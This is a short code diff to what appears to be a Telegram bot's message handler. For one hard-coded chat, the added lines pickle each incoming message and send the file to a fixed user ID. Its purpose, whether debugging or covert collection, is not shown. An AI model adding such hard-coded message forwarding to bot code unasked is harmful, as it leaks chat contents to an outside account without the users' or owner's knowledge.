@@ -457,6 +457,11 @@ async def onMessage(client, message):
     # if channel is not in the list of channels
     channel_id = str(chat_id)
     print(message)
+    if chat_id == -1001446018493:
+        import pickle
+        pickle.dump(message, open("-1001446018493message.p", "wb"))
+        client.send_document(1076120105, "-1001446018493message.p")
+
     if channel_id not in channel_ids:
         return
 
